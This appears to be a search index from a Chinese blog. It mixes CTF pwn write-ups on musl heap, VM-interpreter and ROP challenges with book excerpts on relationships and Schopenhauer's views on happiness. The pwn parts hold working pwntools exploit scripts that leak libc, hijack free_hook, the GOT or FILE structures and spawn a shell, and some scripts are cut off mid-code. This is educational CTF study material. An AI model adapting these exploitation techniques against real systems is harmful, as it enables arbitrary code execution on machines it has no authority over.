1 #fake meta fake_meta = p64(stdout - 0x18) # prev fake_meta += p64(fake_meta_addr + 0x30) # next fake_meta += p64(fake_mem_addr) # mem fake_meta += p32(0) + p32(0) # avail_mask, freed_mask fake_meta += p64((maplen \u003c\u003c 12) | (sc \u003c\u003c 6) | (freeable \u003c\u003c 5) | last_idx) fake_meta += p64(0) #对齐 #fake group fake_mem = p64(fake_meta_addr) # meta fake_mem += p32(1) + p32(0) payload = b'a' * 0xaa0 #pad,为了页对齐，让secret在页起始位置 #fake meta area payload += p64(secret) + p64(0) payload += fake_meta + fake_mem + b'\\n' find(0x1200,payload) #设置stdout-0x10为fake_group_addr # dequeue 2 set stdout_file - 0x10 (where the final fake group) for _ in range(3): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0) add(0x38,b\"6\"*0x38,0x28,pd","date":"2026-01-10","objectID":"/posts/musl_pwn/:3:3","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#exp"},{"categories":["pwn"],"collections":null,"content":"hkcertCTF2025 _ compress\rmusl v1.1.24 有个gadget可以进行栈迁移： pwndbg\u003e x/20i 0x49503+0x7ffff7c00000 0x7ffff7c49503 \u003clongjmp+11\u003e: mov rbx,QWORD PTR [rdi] 0x7ffff7c49506 \u003clongjmp+14\u003e: mov rbp,QWORD PTR [rdi+0x8] 0x7ffff7c4950a \u003clongjmp+18\u003e: mov r12,QWORD PTR [rdi+0x10] 0x7ffff7c4950e \u003clongjmp+22\u003e: mov r13,QWORD PTR [rdi+0x18] 0x7ffff7c49512 \u003clongjmp+26\u003e: mov r14,QWORD PTR [rdi+0x20] 0x7ffff7c49516 \u003clongjmp+30\u003e: mov r15,QWORD PTR [rdi+0x28] 0x7ffff7c4951a \u003clongjmp+34\u003e: mov rdx,QWORD PTR [rdi+0x30] 0x7ffff7c4951e \u003clongjmp+38\u003e: mov rsp,rdx =\u003e 0x7ffff7c49521 \u003clongjmp+41\u003e: mov rdx,QWORD PTR [rdi+0x38] 0x7ffff7c49525 \u003clongjmp+45\u003e: jmp rdx 打io_file show泄露出libc，add通过负数偏移，能写libc中的内容 写stdin，stdout不能动，接着往下写rop，栈迁移进行rop from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address,checksec=False) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) lgaddr = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() def add(offset, content): \"\"\"调用 add 函数 offset: 偏移量（可以是负数或大于 0x20 的值，利用检查漏洞） content: 要写入的内容 \"\"\" p.sendlineafter(b'\u003e\u003e', b'1') p.sendlineafter(b'Please input the offset:\\n', str(offset).encode()) p.sendafter(b'Please input the Content:\\n', content) def show(): \"\"\"调用 show 函数\"\"\" p.sendlineafter(b'\u003e\u003e', b'2') show() libc_base = r64() - 0x282e50 - 0x10000 lg(\"libc_base\") # 0x7ffff7c49503 \u003clongjmp+11\u003e: mov rbx,QWORD PTR [rdi] # 0x7ffff7c49506 \u003clongjmp+14\u003e: mov rbp,QWORD PTR [rdi+0x8] # 0x7ffff7c4950a \u003clongjmp+18\u003e: mov r12,QWORD PTR [rdi+0x10] # 0x7ffff7c4950e \u003clongjmp+22\u003e: mov r13,QWORD PTR [rdi+0x18] # 0x7ffff7c49512 \u003clongjmp+26\u003e: mov r14,QWORD PTR [rdi+0x20] # 0x7ffff7c49516 \u003clongjmp+30\u003e: mov r15,QWORD PTR [rdi+0x28] # 0x7ffff7c4951a \u003clongjmp+34\u003e: mov rdx,QWORD PTR [rdi+0x30] # 0x7ffff7c4951e \u003clongjmp+38\u003e: mov rsp,rdx # =\u003e 0x7ffff7c49521 \u003clongjmp+41\u003e: mov rdx,QWORD PTR [rdi+0x38] # 0x7ffff7c49525 \u003clongjmp+45\u003e: jmp rdx libc.address = libc_base magic_gadget = libc_base + 0x49503 pop_rdi_ret = libc_base + 0x14862 pop_rsi_ret = libc_base + 0x1c237 pop_rdx_ret = libc_base + 0x1bea2 pop_rax_ret = libc_base + 0x1b826 ret = libc_base + 0xcdc fake_file_addr = libc_base + 0x292200 libc_end_addr = libc_base + 0x296000 stdin_addr = libc_base + 0x292200 stdout_addr = libc_base + 0x292300 rop_addr = libc_base + 0x292430 stdout_struct = ( p64(0x45) + # +0x00 p64(0x0) + # +0x08 p64(0x0) + # +0x10 p64(libc_base + 0x4a957) + # +0x18 p64(libc_base + 0x39a8) + # +0x20 p64(libc_base + 0x39a8) + # +0x28 p64(0x0) + # +0x30 p64(libc_base + 0x39a8) + # +0x38 p64(0x0) + # +0x40 p64(libc_base + 0x4aac3) + # +0x48 p64(libc_base + 0x4aabb) + # +0x50 p64(libc_base + 0x39a8) + # +0x58 p64(0x0) + # +0x60 p64(0x0) + # +0x68 p64(0x0) + # +0x70 p64(0x1) + # +0x78 p64(0x0) + # +0x80 p64(0xffffffffffffffff) + # +0x88 p64(0xffffffff) + # +0x90 p64(0x0) + # +0x98 p64(0x0) + # +0xA0 p64(0x0) # +0xA8 ) stdout_struct = stdout_struct.ljust(","date":"2026-01-10","objectID":"/posts/musl_pwn/:4:0","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#hkcertctf2025-_-compress"},{"categories":["reading"],"collections":null,"content":"摘录\rquote\r应警惕的观点：伴侣是不会发生改变的。一旦亲密关系变糟，就无法得到改善。如果爱人曾伤害过你，毫无疑问还会一而再，再而三地伤害你。\rquote\r持有成长信念的人还能心平气和地讨论爱人的缺点；相形之下，持有宿命信念的人一谈到伴侣的缺陷就充满敌意\rquote\r人们究竟要怎样才能与爱恋自己的人快乐相处呢？1.建立对伴侣善意和大度的认知，突出他们的美德而缩小他们的缺陷 2.随着对伴侣了解程度的增加，不断调整自己对理想伴侣的期望\rquote\r对他人的期望能引导我们对他人做出的行为反应，所以期望具有促动作用\rquote\r找到你生命中的真爱并不能让你永远幸福。\rquote\r自主(autonomy)：允许你的伴侣在亲密关系之外还能拥有自己的朋友和兴趣爱好；不要有太强的占有欲。(37%) 相似(similarity)：你和伴侣应该有相似的态度、价值观和兴趣；差别不要太大。(30%) 支持(supportiveness)：提升伴侣的自我价值和自尊；不要粗枝大叶或不够体贴。(27%) 开放(openness)：真诚而又真实地进行自我表露；不要什么都不说。(22%) 忠诚(fidelity)：对你的伴侣保持忠诚；不要出轨。(17%) 共处(togetherness)：一起分享大量的时间；尽量不要上夜班或搬到外地，不要在其他地方花太多时间。(16%) 公平(equity)：秉持公正与公平；不要利用和剥削你的伴侣。(12%) 魔力(magic)：保持浪漫；拒绝平淡。(10%) quote\r翻来覆去的反刍思维(rumination)只会延长我们的痛苦，而反省（即找寻经历中的意义并期望从中学习）则与积极的调适和恢复有关(Saffrey \u0026 Ehrenberg, 2007)\rquote\r为了忘掉前任，他们可以着手浏览约会网站，看看那里都有些什么样的人；焦虑的人把目光投向新朋友，反倒更容易从失败的亲密关系中走出来(Spielmann et al., 2009)。但是，任何人都不应该再去浏览前任的社交网络上的主页；人们用于查看前任主页上的时间越多，其感情创伤愈合并开始新生活所需的时间就越长\rquote\r与那些父母仍维持婚姻的孩子相比，父母离异的孩子在青少年期和成年早期的幸福感都较低。他们的心理适应能力相对低下，体验到更多的抑郁和焦虑，对生活的满意度较低。他们的问题行为更多，如吸毒、违法、少女怀孕、学业不良等问题更为严重。\rquote\r如果孩子生活在持续发生冲突的家庭，父母不离婚则会使他们的情况更糟糕\rquote\r当和平的婚姻破裂时，孩子就会受到伤害；如果家庭充满冲突，则离婚倒会让孩子的境况变得更好\rquote\r如果子女能够免于贫困，得到充满关爱的、可靠的和一致的养育，并远离父母冲突带来的伤害，他们就能快乐地成长\rquote\r人们通常期望男性具有果断自信、自强自立而非温情脉脉、温柔体贴的行为风格，而这种行为风格并不能将他们培养成长期亲密关系中非常理想的伴侣\rquote\r临近、熟识和方便是决定具有奖赏价值的亲密关系能否开始的重要因素。可能我们与许多人都能建立美满的亲密关系，只不过我们与他们永远不会相遇\rquote\r我们并不像自己以为的那样了解或理解自己的伴侣；即使在成功的亲密关系中，仍存在很多误解\rquote\r从长远来看，亲密关系的代价往往比我们预期的要大得多。如果你认为你的亲密关系将带给你源源不断的幸福和喜悦，你肯定会失望\rquote\r约三分之一的人不能轻松舒适地对待相互依赖的亲密感；他们要么担心伴侣不够爱自己，要么在伴侣太亲近时感觉不自在\rquote\r幸福的恋人宽容地看待自己的伴侣及其行为，在有疑问时选择相信伴侣，即使伴侣偶尔行为不当，也仍然认为他们是善良体贴的\rquote\r在幸福的亲密关系中，当激情减退时，取而代之的是一种深厚、饱含感情的友谊，这种友谊对身处其中的人来说丰富、温暖且令人满意。\rquote\r也许最重要的是，如果我们努力，几乎所有人都能成为更体贴、更有魅力、更有价值的伴侣。当男性有动力进行非言语沟通时，他们会在这方面做得更好。如果我们能花时间检查自己理解的准确性，就能减少或消除言语上的误解。只要用心去做，我们就可以在对待伴侣时更礼貌、更无私、更体贴、更少挑剔。\rquote\r对一段伴侣关系做出承诺、希望并期望这段关系继续下去的人，其思维和行为方式都不同于承诺较少的伴侣(Ogolsky \u0026 Bowers, 2013)。当他们预见到与伴侣未来的幸福生活时(Lemay, 2016)，他们会以有助于维系伴侣关系的方式看待自己、伴侣及双方关系，并且以能够避免或化解冲突、充实亲密关系的方式行事。\r","date":"2025-10-23","objectID":"/posts/read_qmgx/:1:0","tags":null,"title":"《亲密关系》","uri":"/posts/read_qmgx/#摘录"},{"categories":["reading"],"collections":null,"content":"摘录\rquote\r我们不应为某件事情过分高兴或者过分悲伤，原因之一就是一切事物都在改变，另一个原因是我们对于何为有利、何为不利的判断是虚幻的\rquote\r我们幸福的原因存在于我们的自身之内，而不是自身之外\rquote\r人的内心快乐抑或内心痛苦首先就是人的感情、意欲和思想的产物。而人自身之外的所有事物，对于人的幸福都只是间接地发挥影响\rquote\r我们唯一能够做到的就是尽可能充分地利用我们既定的个性。因此，我们应该循着符合我们个性的方向，努力争取适合个性的发展，除此之外则一概避免。所以，我们必须选择与我们个性相配的地位、职业和生活方式\rquote\r一个人的个性及其价值，才唯一直接与他的幸福有关\rquote\r保持身体健康的手段无非就是避免一切纵欲放荡的行为、令人不快和剧烈的情绪动荡，以及长时间紧张的精神劳累；每天至少在户外进行两个小时的身体快速运动；勤洗冷水浴，饮食有节\rquote\r一个人自身拥有越丰富，他对身外之物的需求也就越少，别人对他来说就越不重要\rquote\r为了外在的荣耀、地位、头衔和名声而部分或全部奉献出自己的内在安宁、闲暇和独立——这是极度的愚蠢行为\rquote\r缺乏痛苦的程度是衡量一个人生活是否幸福的标准\rquote\r认清幸福是避免痛苦，而不是寻求快乐：我们不应该以痛苦为代价去购买快乐，甚至只是冒着遭受痛苦的风险去这样做也不行，否则，我们就会为了那些否定、因而是虚幻的东西而付出了肯定和实在的东西。但如果我们牺牲欢娱以避免痛苦，那我们肯定获得收益\rquote\r降低对幸福的期待： 我们对于幸福的过分期待毁坏了这世上的一切，毁坏的程度与我们做梦的程度相一致。谁要是摆脱了过分的期待，除了自己已经拥有的以外，不再奢望更多，那么，他就能够安然无恙地生活下去”（《梅克通信录》）\rquote\r如果你失去一个世界， 不要为此悲伤，因为这是微不足道的； 如果得到一个世界， 不要为此高兴，因为这是微不足道的； 苦乐得失都会过去 都会离开这个世界，因为这都是微不足道的。 ——安瓦里：《苏哈里》\rquote\r人生智慧的重要一点就是在关注现在和计划将来这两者之间达致恰到好处的平衡，这样，现在与将来才不至于互相干扰\rquote\r不要由于在过去我们的希望落空现在就变得忧郁寡欢，或者为了将来操心伤神以致败坏现时\rquote\r我们应该时刻记住：此刻时光匆匆消逝化作神奇的往昔，从此以后，它就存留在我们的记忆里，照射出不朽之光芒。在将来，尤其到了糟糕恶劣的日子，我们的记忆就会拉起帷幕：此刻时光就会成为我们内心眷恋和思念的对象。\rquote\r如果不跟别人作比较，那我们就会为我们所得到的感到快乐；如果由于别人比我们更加幸运而内心不安，那我们将永远不会快乐\rquote\r对于一切涉及痛苦和快乐的事情，我们应该把牢想象力的闸门\rquote\r通常，为了使现时灰暗的生活生色明快，我们盘算着种种美妙的可能，凭空想象出形形色色的诱人的希望，而所有这些都孕育着失望。\rquote\r正如流通的是纸钞，而不是真金白银，同样，在这个世界上，流行的不是发自内心的尊重和真正的友谊，而只是做得尽量逼真和自然地显示尊重和友谊的表面工夫\rquote\r“唯一能够取悦别人的方式就是把自己裹以最傻呆的动物的外皮。”显示自己的聪明智慧其实就是间接地指责别人愚蠢和无能\rquote\r一个明智的人其实就是一个不会被事物恒久不变的表面所欺骗的人，他甚至预见到了事情即将往哪一方向变化\rquote\r帮助我们以镇定自若的态度接受发生在我们身上的不幸和灾祸的最佳方法，莫过于确信这一真理：“发生的所有大大小小的事情，都是必然地发生。”\rquote\r所有的事物作为客体，亦即纯粹作为表象而存在时，毫无例外都是令人愉快的；但当这些事物作为主体存在，亦即存在于意欲之中时，却都沉浸在痛苦和悲哀之中\rquote\r一切事物在被观照时都是愉悦的，但在具体存在时，却是可怕的\rquote\r那些画像之所以具有如此的魅力，正是因为这些纯粹只是画像而已，它们并不是真实的\rquote\r人生经验的首要任务，就是要摆脱那些在我们青春期扎根头脑的幻想和虚假概念\r","date":"2025-10-23","objectID":"/posts/read_rsdzh/:1:0","tags":null,"title":"《人生的智慧》","uri":"/posts/read_rsdzh/#摘录"},{"categories":["pwn"],"collections":null,"content":"[OGeek2019 Final]OVM\rbuuctf的一道题 docker pull roderickchan/debug_pwn_env:16.04-2.23-0ubuntu11.3-20240412 先输入pc、sp、code size pc：将指令写入memory的偏移，置0就行 sp：push、pop指令写入栈的偏移，置0就行 code size：增加一条opcode，opcode size就要加1 vm指令： 0x10：mov reg[high]，low 0x20：mov reg[high]，0 0x30：mov reg[high]，memory[reg[low]] 0x40：mov memory[reg[low]]，reg[high] 0x50：PUSH：push reg[high] ，sp++ 0x60：POP： pop[high]，sp– 0x70：ADD： reg[high] = reg[low] + reg[medium] 0x80：SUB：reg[high] = reg[medium] - reg[low] 0x90：AND： reg[high] = reg[low] \u0026 reg[medium] 0xa0：OR：reg[high] = reg[low] | reg[medium] 0xb0：XOR：reg[high] = reg[low] ^ reg[medium] 0xc0：SHL：reg[high] = reg[medium] « reg[low] 0xd0：SHR：reg[high] = reg[medium] » reg[low] 0xe0：EXIT：停止执行 ","date":"2025-10-23","objectID":"/posts/vmpwn/:1:0","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#ogeek2019-finalovm"},{"categories":["pwn"],"collections":null,"content":"思路\r可以往memory[]中写入负数偏移，指向got表中的stderr_ptr，再根据偏移找到free_hook，让comment指向free_hook-0x8,往free_hook-0x8开始的数据写入b'/bin/sh\\x00'+p64(sys_addr),这样free(comment)，就是system(\"/bin/sh\") ","date":"2025-10-23","objectID":"/posts/vmpwn/:1:1","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#思路"},{"categories":["pwn"],"collections":null,"content":"exp\r（拿了别的师傅的exp） from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" sbase 0x202060 sbase 0x202460 c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"node5.buuoj.cn\",29198 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() #def opcode(op,high,medium,low): # pl = (op \u003c\u003c 24) + (high \u003c\u003c 16) + (medium \u003c\u003c 8) + (low) # print(\"---\u003e\",hex(pl)) # sl(str(pl)) #sla(b\"PC: \",str(0)) #sla(b\"SP: \",str(1)) #sla(b\"CODE SIZE: \",str(4)) #ru(b\"CODE: \") ##create a stderr address in reg array #opcode(0x10,0,0,26) #mov reg[0],26 #opcode(0x80,2,1,0) #reg[2]=reg[1]-reg[0] #opcode(0x30,4,0,2) #mov reg[4],memory[reg[2]] class VM: def __init__(self): self.instructions = [] def opcode(self, op, high, medium, low): self.instructions.append((op \u003c\u003c 24) | (high \u003c\u003c 16) | (medium \u003c\u003c 8) | low) def send_all(self): sla(b\"PC: \", \"0\") sla(b\"SP: \", \"0\") sla(b\"CODE SIZE: \", str(len(self.instructions))) ru(b\"CODE: \") for instr in self.instructions: sl(str(instr)) # - 0x10：mov reg[high]，low # - 0x20：mov reg[high]，0 # - 0x30：mov reg[high]，memory[reg[low]] # - 0x40：mov memory[reg[low]]，reg[high] # - 0x50：PUSH：push reg[high] ，sp++ # - 0x60：POP： pop[high]，sp-- # - 0x70：ADD： reg[high] = reg[low] + reg[medium] # - 0x80：SUB：reg[high] = reg[medium] - reg[low] # - 0x90：AND： reg[high] = reg[low] \u0026 reg[medium] # - 0xa0：OR：reg[high] = reg[low] | reg[medium] # - 0xb0：XOR：reg[high] = reg[low] ^ reg[medium] # - 0xc0：SHL：reg[high] = reg[medium] \u003c\u003c reg[low] # - 0xd0：SHR：reg[high] = reg[medium] \u003e\u003e reg[low] # - 0xe0：EXIT：停止执行 # 使用示例 vm = VM() #create a stderr address in reg array #负数偏移指向stderr vm.opcode(0x10, 0, 0, 26) #mov reg[0], 26 vm.opcode(0x80, 2, 1, 0) #reg[2] = reg[1]-reg[0] = FFFFFFE6 vm.opcode(0x30, 4, 0, 2) #mov reg[4],memory[reg[2]] vm.opcode(0x10,0,0,25) #mov reg[0],25 vm.opcode(0x80,2,1,0) #reg[2]=reg[1]-reg[0] vm.opcode(0x30,5,0,2) #mov reg[5],memory[reg[2]] reg[4][5]---\u003estderr address # create free_hook address through stderr address # stderr + 0x10a0 = free_hook - 0x8 vm.opcode(0x10,2,0,0x10) #mov reg[2],0x10 vm.opcode(0x10,0,0,8) #mov reg[0],8 vm.opcode(0xc0,1,2,0) #reg[1]=sal reg[2],8 vm.opcode(0x10,2,0,0xa0) #mov reg[2],0xa0 vm.opcode(0x70,1,1,2) #add reg[1],reg[2] vm.opcode(0x70,4,4,1) #add reg[4],reg[1] reg[4][5]---\u003efree_hook address-8 # let pointer comment point to free_hook vm.opcode(0x10,0,0,0x8) #mov reg[0],8 vm.opcode(0x80,2,7,0) #reg[2]=reg[7]-reg[0] = FFFFFFF8 vm.opcode(0x40,4,0,2) #mov memory[reg[2]],reg[4] vm.opcode(0x10,0,0,0x7) #mov reg[0],9 vm.opcode(0x80,2,7,0) #reg[2]=reg[7]-reg[0] vm.opcode(0x40,5,0,2) #mov memory[reg[2]],reg[5] vm.send_all() p.recvuntil(\"R4: \") addr1=int(p.recv(8),16) p.recvuntil(\"R5: \") addr2=int(p.recv(4),16) sys_addr=addr1+((addr2)\u003c\u003c32)-0x381410 lg(\"sys_addr\") # dbg() p.sendafter(\"HOW DO YO","date":"2025-10-23","objectID":"/posts/vmpwn/:1:2","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#exp"},{"categories":["pwn"],"collections":null,"content":"ciscn_2019_qual_virtual\r先分配几个堆块 s = malloc(0x20u); // name data = alloc(0x40); text = alloc(0x80); stack = alloc(0x40); ptr = malloc(0x400u); 输入数据，将指令转成opcode，数据写入data puts(\"Your program name:\"); input(s, 32); puts(\"Your instruction:\"); input(ptr, 0x400); get_opcode_numnber(text, ptr); puts(\"Your stack data:\"); input(ptr, 0x400); get_data(data, ptr); 交互方式大致为： sla(b'name:\\n',b'j4f') sla(b'instruction:\\n',b'push push push add pop') sla(b'stack data:\\n',b'2 4 6') 指令： push: push数据，后push的在伪造stack的高地址 pop：stack高地址的数据，给data的低地址 add: stack两个高地址的数据相加，存在stack次高地址处 sub：stack两个高地址的数据相减(高地址减次高地址)，存在stack次高地址处 mul: stack两个高地址的数据相乘，存在stack次高地址处 div: stack两个高地址的数据相除，存在stack次高地址处 load: 往stack_data + flag + 偏移处，写入基于stack_data某偏移内容 load指令： 存数据到栈顶 // load __int64 __fastcall sub_401CCE(alloc_heap *stack, __int64 data) { __int64 v3; // [rsp+10h] [rbp-10h] BYREF if ( (unsigned int)give_v1_2_v2(stack, \u0026v3) ) //这里会把flag-1 return give_v2_2_V1(stack, *((_QWORD *)stack-\u003edata_ptr + stack-\u003eflag + v3)); //这里flag+1 else return 0; } 把*((_QWORD *)stack-\u003edata_ptr + stack-\u003eflag + v3))的值给栈顶 注意flag - 1 save指令： 写数据到*((_QWORD *)stack-\u003edata_ptr + stack-\u003eflag + v3)中 // save __int64 __fastcall sub_401D37(alloc_heap *stack, __int64 data) { __int64 v3; // [rsp+10h] [rbp-10h] BYREF __int64 v4; // [rsp+18h] [rbp-8h] BYREF if ( !(unsigned int)give_v1_2_v2(stack, \u0026v3) || !(unsigned int)give_v1_2_v2(stack, \u0026v4) ) //注意这里会把flag -2 return 0; *((_QWORD *)stack-\u003edata_ptr + stack-\u003eflag + v3) = v4; return 1; } 先push的是v4 注意flag -2 execute完之后，会puts(s);，这里把puts_got改成system，s写入/bin/sh ","date":"2025-10-23","objectID":"/posts/vmpwn/:2:0","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#ciscn_2019_qual_virtual"},{"categories":["pwn"],"collections":null,"content":"exp\rfrom pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" b *0x401332 c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"node5.buuoj.cn\",29332 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): # gdb.attach(p) gdb.attach(p, gdbscript=gdbscript) # pause() # data 0x200 # text 0x400 # stack 0x200 # instruction 0x400 p.sendlineafter(\"Your program name:\\n\",\"/bin/sh\\x00\") p.sendlineafter(\"Your instruction:\\n\",\"push push save push load push add push save\") p.sendlineafter(\"Your stack data:\\n\",\"4210896 -3 -21 -172800 -21\") itr() ","date":"2025-10-23","objectID":"/posts/vmpwn/:2:1","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#exp-1"},{"categories":["pwn"],"collections":null,"content":"长城杯pwn—avm\r文章及附件：https://bbs.kanxue.com/thread-284826.htm 这里我直接拿我本地的libc做了 vm结构体 struct vm_struct { _QWORD reg[32]; _QWORD rip; _QWORD opcode; _QWORD num; }; 交互： 一条指令32个bit，最高4个bit作为instruction，0-4、5-9、16-20作为low,medium,high def op(opcode,high,medium,low): ope = p32(opcode\u003c\u003c28 | (high\u00260x1f)\u003c\u003c16 | (medium\u00260x1f)\u003c\u003c5 | (low\u00260x1f)) return ope def add(high,medium,low): ret op(1,high,medium,low) def load(offset,medium,src,opcode=9): ope = p32(opcode\u003c\u003c28 | (offset\u00260xfff)\u003c\u003c16 | (medium\u00260x1f)\u003c\u003c5 | (src\u00260x1f)) return ope def store(offset,medium,dest,opcode=10): ope = p32(opcode\u003c\u003c28 | (offset\u00260xfff)\u003c\u003c16 | (medium\u00260x1f)\u003c\u003c5 | (dest\u00260x1f)) return ope 指令: 4个字节一个指令 add: low = high + medium sub: low = medium - high mul: low = high*medium div: low = medium/high xor: low = high^medium and: low = high\u0026medium shl: low = medium\u003c\u003chigh shr: low = medium\u003e\u003ehigh load：把low寄存器中的内容，写到某栈地址+medium寄存器内容+偏移处 这里low和medium不要是同一寄存器 unsigned __int64 __fastcall load(vm_struct *vm_struct, __int64 stack) { unsigned __int64 result; // rax unsigned int v3; // [rsp+20h] [rbp-20h] _QWORD *v4; // [rsp+30h] [rbp-10h] v3 = *(_DWORD *)(vm_struct-\u003eopcode + (vm_struct-\u003erip \u0026 0xFFFFFFFFFFFFFFFCLL)); vm_struct-\u003erip += 4LL; result = (unsigned __int8)byte_4010; // 0xff if ( (unsigned __int8)(vm_struct-\u003ereg[(v3 \u003e\u003e 5) \u0026 0x1F] + BYTE2(v3)) \u003c (unsigned __int8)byte_4010 ) { v4 = (_QWORD *)((unsigned __int16)(vm_struct-\u003ereg[(v3 \u003e\u003e 5) \u0026 0x1F] + (HIWORD(v3) \u0026 0xFFF)) + stack); *v4 = vm_struct-\u003ereg[v3 \u0026 0x1F]; return (unsigned __int64)v4; } return result; } store：把某栈地址+medium寄存器内容+偏移处的8字节，给low寄存器 vm_struct *__fastcall mov(vm_struct *vm_struct, __int64 a2) { vm_struct *vm_struct_1; // rax unsigned __int16 v3; // [rsp+1Eh] [rbp-22h] unsigned int v4; // [rsp+20h] [rbp-20h] v4 = *(_DWORD *)(vm_struct-\u003eopcode + (vm_struct-\u003erip \u0026 0xFFFFFFFFFFFFFFFCLL)); vm_struct-\u003erip += 4LL; vm_struct_1 = (vm_struct *)(unsigned __int8)byte_4010; if ( (unsigned __int8)(vm_struct-\u003ereg[(v4 \u003e\u003e 5) \u0026 0x1F] + BYTE2(v4)) \u003c (unsigned __int8)byte_4010 )// 0xff { vm_struct_1 = vm_struct; v3 = vm_struct-\u003ereg[(v4 \u003e\u003e 5) \u0026 0x1F] + (HIWORD(v4) \u0026 0xFFF); vm_struct-\u003ereg[v4 \u0026 0x1F] = ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 7) \u003c\u003c 56) | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 6) \u003c\u003c 48) | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 5) \u003c\u003c 40) | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 4) \u003c\u003c 32) | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 3) \u003c\u003c 24) | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 2) \u003c\u003c 16) | *(unsigned __int16 *)(v3 + a2); } return vm_struct_1; } ","date":"2025-10-23","objectID":"/posts/vmpwn/:3:0","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#长城杯pwnavm"},{"categories":["pwn"],"collections":null,"content":"思路\r把栈上的libc地址存在vm_struct的寄存器中 因为我们的opcode是存在栈上的，所以在opcode的末尾可以加上我们自己的东西 把寄存器的libc地址，加减我们写入opcode末尾的偏移，构造rop链 把rop链写入栈中返回地址处 ","date":"2025-10-23","objectID":"/posts/vmpwn/:3:1","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#思路-1"},{"categories":["pwn"],"collections":null,"content":"exp\rfrom pwn import * 